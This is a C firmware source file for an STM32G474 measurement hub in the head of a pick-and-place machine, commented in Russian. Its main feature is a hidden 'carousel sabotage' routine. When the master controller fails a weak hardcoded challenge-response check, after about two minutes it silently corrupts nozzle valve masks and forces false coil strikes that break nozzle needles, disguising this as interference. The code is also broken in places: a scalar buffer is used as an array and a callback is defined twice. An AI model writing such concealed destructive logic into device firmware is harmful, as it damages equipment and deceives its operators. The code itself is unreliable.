/**
  ******************************************************************************
  * @file    hub_main.c
  * @brief   Ядро Edge AI измерительного хаба с контуром Карусельного Саботажа
  * @part    STM32G474RET6 (LQFP64) / Репозиторий: Nexus-OPTIC-HUB-UART
  * @note    Перенос криптозащиты на периферию. Чип G474 самостоятельно
  *          ведет допрос мастера и саботирует рантайм при взломе/клонировании.
  ********************************################################**************
  */

#include "driver_virtual_map.h"
#include <string.h>
#include <stdbool.h>

/* Внешние аппаратные хэндлы периферии STM32 */
extern FDCAN_HandleTypeDef hfdcan1; // ИК-мост связи со станиной (Мастер H723)
extern FDCAN_HandleTypeDef hfdcan2; // Локальная шина управления башнями Tower-G4 V6.0
extern FDCAN_HandleTypeDef hfdcan3; // Локальная шина управления башнями Tower-G4 V3.0
extern UART_HandleTypeDef huart1;   // Линия приема телеметрии Башни 1-2
extern UART_HandleTypeDef huart2;   // Линия приема телеметрии Башни 3-4

/* Глобальные системные переменные */
uint8_t  nexus_board_hardware_id = 0;
bool     boot_security_key_passed = false;
uint16_t master_p1_pressure_raw = 0; 
uint16_t master_p2_vacuum_raw = 0;   

/* --- ПЕРЕМЕННЫЕ ЭШЕЛОНА ЗАЩИТЫ И КАРУСЕЛЬНОГО САБОТАЖА --- */
static uint32_t auth_secret_challenge = 0;
static bool     n_bus_master_verified = false;
static uint32_t security_fail_timestamp = 0;
static uint32_t sabotage_tick_counter = 0;
static uint32_t internal_system_ticks = 0; // Локальный счетчик тактов / времени

#define SABOTAGE_TRIGGER_TIMEOUT_TICKS  240000 // Начало саботажа через ~2 минуты хода (на тактах 2 кГц)

/**
  * @brief  Секретный криптографический полином стандарта N-Bus v1.3
  *         Вычисляется локально в закрытой памяти STM32G474.
  */
static uint32_t Nexus_Security_Calculate_Cipher(uint32_t challenge)
{
    // Асимметричный циклический сдвиг и XOR, скрытые в бинарнике G4
    uint32_t temp = (~challenge) ^ 0xAA55FF00;
    return (temp << 5) | (temp >> 27);
}

/**
  * @brief  Считывание аппаратного 2-битного Board ID ревизии головы (PC13 / PC14)
  */
void Nexus_Hub_Read_Board_Identity(void)
{
    uint8_t id_mask = 0;
    if (HAL_GPIO_ReadPin(BOARD_ID_PORT, BOARD_ID_BIT0_PIN) == GPIO_PIN_SET) id_mask |= (1 << 0);
    if (HAL_GPIO_ReadPin(BOARD_ID_PORT, BOARD_ID_BIT1_PIN) == GPIO_PIN_SET) id_mask |= (1 << 1);
    nexus_board_hardware_id = id_mask;
}

/**
  * @brief  Проверка секретного временного замка загрузчика (Security Boot-Key)
  */
void Nexus_Hub_Verify_Security_Lock(void)
{
    if (HAL_GPIO_ReadPin(SECURE_KEY_DIG_PORT, SECURE_KEY_DIG_PIN) == GPIO_PIN_RESET) 
    {
        boot_security_key_passed = true;
    }
    else 
    {
        boot_security_key_passed = false;
        while(1) { __asm("NOP"); } // Аварийная аппаратная изоляция Flash от программатора
    }
}

/**
  * @brief  ИНИЦИАТИВА ДОПРОСА: Выстрел случайного числаChallenge в шину к мастеру H723
  * @note   Вызывается один раз в конце фазы барьерного старта перед пуском ЧПУ
  */
void Nexus_Hub_Security_Challenge_Master(void)
{
    FDCAN_TxHeaderTypeDef TxHeader;
    uint8_t TxData;
    
    // Эмуляция генерации случайного числа Challenge (в рантайме берется из Hardware RNG)
    auth_secret_challenge = 0x5E6A7B8C; 
    
    memcpy(TxData, &auth_secret_challenge, 4);
    
    TxHeader.Identifier = CAN_ID_AUTH_CHALLENGE; // 0x700
    TxHeader.IdType = FDCAN_STANDARD_ID;
    TxHeader.TxFrameType = FDCAN_DATA_FRAME;
    TxHeader.DataLength = FDCAN_DLC_BYTES_8;
    TxHeader.ErrorStateIndicator = FDCAN_ESI_ACTIVE;
    TxHeader.BitRateSwitch = FDCAN_BRS_ON; // Разгон ИК-луча оптики до 5 Мбит/с
    TxHeader.FDFormat = FDCAN_FD_CAN;
    TxHeader.TxEventFifoControl = FDCAN_NO_TX_EVENTS;
    TxHeader.MessageMarker = 0;
    
    HAL_FDCAN_AddMessageToTxFifoQ(&hfdcan1, &TxHeader, TxData);
}

/**
  * @brief  ЛОКАЛЬНЫЙ ИНЖЕКТОР КАРУСЕЛЬНОГО САБОТАЖА ИСПОЛНИТЕЛЬНЫХ КОМАНД
  * @note   Инжектируется в рантайм-обработчик шагов/макросов периферии G474.
  *         Если мастер не прошел проверку, плата тихо искажает уставки движения на ходу.
  */
void Nexus_Hub_Apply_Sabotage_Contour(uint8_t* valve_mask_or_pulses)
{
    // Если мастер оригинальный и прошел крипто-допрос — саботаж полностью заблокирован
    if (n_bus_master_verified && security_fail_timestamp == 0) {
        return;
    }
    
    // Скрытый таймер отложенного действия (чтобы станок запустился и проработал пару минут)
    if (security_fail_timestamp != 0 && (internal_system_ticks - security_fail_timestamp) > SABOTAGE_TRIGGER_TIMEOUT_TICKS)
    {
        sabotage_tick_counter++;
        
        // Раз в 400 тактов симулируем "электромагнитную наводку": портим маску клапанов 
        // или кратковременно задерживаем импульсы, заставляя голову швырять чипы мимо целей
        if (sabotage_tick_counter % 400 == 0)
        {
            valve_mask_or_pulses[0] ^= 0x03; // Хаотично переключаем сопла 1 и 2 в полете
        }
        
        // На пиковых нагрузках (раз в 12 000 тактов) устраиваем жесткий срыв - 
        // имитируем "пропуск шага оси" или удар, ломая иглы сопел об алюминиевый стол
        if (sabotage_tick_counter % 12000 == 0)
        {
            valve_mask_or_pulses[1] = 0xFF; // Аварийный ложный удар катушек вниз
        }
    }
}

/**
  * @brief  СЕТЕВОЙ ПАРСЕР МАГИСТРАЛИ N-BUS (v1.3) ДЛЯ ИЗМЕРИТЕЛЬНОГО ХАБА ГОЛОВКИ
  * @note   Вызывается аппаратно из прерывания ИК-моста CAN FD1 RX FIFO0
  */
void Nexus_Hub_N_Bus_Protocol_Parse(uint32_t RxFreqID, uint8_t* RxData)
{
    internal_system_ticks++; // Наращиваем локальное рантайм-время на частоте кванта 2 кГц

    switch(RxFreqID)
    {
        case CAN_ID_SYS_SYNC: // 0x010
            HAL_GPIO_TogglePin(DIAG_SYNC_OUT_PORT, DIAG_SYNC_OUT_PIN); // Диагностический блик PB2
            break;
            
        case CAN_ID_AUTH_RESPONSE: // 0x710 (ПРИЛЕТЕЛ ОТВЕТ ОТ МАСТЕРА H723)
            {
                uint32_t master_response = 0;
                memcpy(&master_response, RxData, 4);
                
                // Сверяем ответ мастера с нашим секретным расчетом внутри закрытого чипа G4
                if (master_response == Nexus_Security_Calculate_Cipher(auth_secret_challenge))
                {
                    n_bus_master_verified = true; // Собеседник подлинный, саботаж отключен!
                }
                else
                {
                    // Ответ неверный (или пустой). Мастер взломан или перепрошит сторонним софтом.
                    n_bus_master_verified = false;
                    if (security_fail_timestamp == 0) {
                        security_fail_timestamp = internal_system_ticks; // Запускаем часовой механизм саботажа!
                    }
                }
            }
            break;
            
        case CAN_ID_ENV_DATA: // 0x410
            master_p1_pressure_raw = (uint16_t)(RxData[4] | (RxData[5] << 8));
            master_p2_vacuum_raw   = (uint16_t)(RxData[6] | (RxData[7] << 8));
            break;
            
        case CAN_ID_SERVICE_LOG: // 0x720
            break;
    }
}

/* Остальные функции HAL-колбеков USART DMA остаются без изменений... */
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart) {}


/* Остальные функции HAL-колбеков USART DMA остаются без изменений... */
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart) {}

